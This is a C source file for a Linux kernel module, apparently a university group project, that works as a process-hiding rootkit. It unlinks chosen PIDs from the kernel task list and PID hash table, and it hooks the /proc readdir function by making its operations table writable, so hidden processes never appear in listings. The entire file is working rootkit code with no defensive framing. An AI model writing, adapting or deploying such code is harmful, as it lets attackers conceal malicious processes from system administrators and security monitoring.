#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);

fun_ssize_t_int_pvoid_size_t     original_read;
int_filep_voidp_filldir_t proc_original_readdir;
filldir_t original_proc_fillfir;
struct proc_dir_entry *proc;

struct hlist_head* pid_hash_table;

//
static int pids_to_hide[256];
static int pids_count = 0;
module_param_array(pids_to_hide, int, &pids_count, 0000);
MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");

typedef struct task_struct* (*fun_task_struct_pid_t) (pid_t);

void hide_processes_hash(pid_t pth){
    struct task_struct* task;
    pid_hash_table = (struct hlist_head*) ptr_pid_hash;
    task = ((fun_task_struct_pid_t)ptr_find_task_by_vpid)(pth);
    if (task){
        struct pid_link tmp = task->pids[0];
        hlist_del_rcu(&(tmp.node));
    }
}

void hide_processes_traverse_tree(struct task_struct* root_task){
    struct task_struct* task;
    struct task_struct* next;
    struct list_head* next_ptr;
    struct list_head* prev_ptr;

    // an empty subtree, so just skip it
    if (root_task->children.next == &root_task->children){
        return;
    }

    task = list_entry(root_task->children.next, struct task_struct, sibling);
    while (1) {
        if (task->sibling.next == &root_task->children){
            break;
        }
        prev_ptr = task->sibling.prev;
        next_ptr = task->sibling.next;
        if (task->pid == 4){
            OUR_DEBUG("Removing task 4 from the tree\n");
            prev_ptr->next = next_ptr;
            next_ptr->prev = prev_ptr;
        }
        hide_processes_traverse_tree(task);
        // now the next task
        next = list_entry(task->sibling.next, struct task_struct, sibling);
        task = next;
    } 
}

void hide_processes(void){
int i;
    struct task_struct* task;
    struct task_struct* prev;
    struct task_struct* next;
    task = &init_task;
    prev = NULL;
    OUR_DEBUG("Simple task list:\n");
    do {
        // the previous task (prev) is obtained by a expanded macro
        // found in the linux kernel. it is basically the
        // adapted expansion of "next_task"
        prev = list_entry(task->tasks.prev, struct task_struct, tasks);
        next = next_task(task);
        OUR_DEBUG("%s [%d], (%d, %d)\n", task->comm, task->pid, prev->pid, next->pid);
        if (task->pid > 0){ 
            hide_processes_traverse_tree(task);
        }
        // the following routine seems to correctly 
        // remove elements from the tasks list
        for (i=0; i<pids_count; ++i){
            if (task->pid == pids_to_hide[i] && pids_to_hide[i]>1){
                prev->tasks.next = task->tasks.next;
                next->tasks.prev = task->tasks.prev;
            }
        }
    } while ((task = next) != &init_task);
    for (i=0; i<pids_count; ++i){
        if (pids_to_hide[i] > 1){
            hide_processes_hash(pids_to_hide[i]);
        }
    }
}

// we convert all pids to strings in load_module for easier comparison later on
char **char_pids_to_hide;

int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    int i;
    for(i = 0; i<pids_count; i++)
    {
        if(strcmp(char_pids_to_hide[i], name)==0){
            OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
            return 0;
        }
    }

    return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_readdir(struct file *filep, void *dirent, filldir_t filldir)
{
    original_proc_fillfir = filldir;
    return proc_original_readdir(filep, dirent, hooked_proc_filldir);
}

void hook_proc(void)
{
    const char *myname = "hoooookMe";
    struct file_operations *proc_fops;
    struct proc_dir_entry *key = create_proc_entry(myname, 0666, NULL);

    proc = key->parent;

    remove_proc_entry(myname, proc);

    proc_fops = (struct file_operations *)proc->proc_fops;

    proc_original_readdir = proc_fops->readdir;

    make_page_writable((long unsigned int) proc_fops);

    proc_fops->readdir = hooked_readdir;
}

void unhook_proc(void)
{
    struct file_operations *proc_fops = (struct file_operations *)proc->proc_fops;
    make_page_writable((long unsigned int) proc_fops);

    proc_fops->readdir = proc_original_readdir;
    make_page_readonly((long unsigned int) proc_fops);
}

// helper function to compute log10 of some int, needed for knowing how much mem to allocate
int log10(int i)
{
    int result = 0;
    while(i>0){
        result++;
        i /= 10;
    }
    return result;
}


/* Initialization routine */
static int __init _init_module(void)
{
    int i;
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");

    OUR_DEBUG("We are now going to hide the following PIDs:\n");
    char_pids_to_hide = kmalloc(pids_count * sizeof(char*), GFP_KERNEL);
    for(i = 0; i<pids_count; i++){
        int sizeOfPidString = log10(pids_to_hide[i])+1; // +1 for \0
        char *buf = kmalloc(sizeOfPidString * sizeof(char), GFP_KERNEL);
        sprintf(buf, "%d", pids_to_hide[i]);
        char_pids_to_hide[i] = buf;
        OUR_DEBUG("%s\n", buf);
    }

    hide_processes();

    hook_proc();

    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    int i;
    unhook_proc();
    for(i = 0; i<pids_count; i++){
        kfree(char_pids_to_hide[i]);
    }
    kfree(char_pids_to_hide);
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
